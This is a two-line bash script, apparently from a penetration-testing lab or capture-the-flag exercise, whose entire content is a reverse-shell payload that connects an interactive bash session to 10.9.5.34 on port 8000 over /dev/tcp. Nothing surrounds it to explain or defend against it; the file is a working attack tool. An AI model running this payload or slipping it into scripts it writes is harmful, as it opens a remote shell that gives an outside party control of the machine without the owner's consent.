#!/bin/bash

bash -ip >& /dev/tcp/10.9.5.34/8000 0>&1
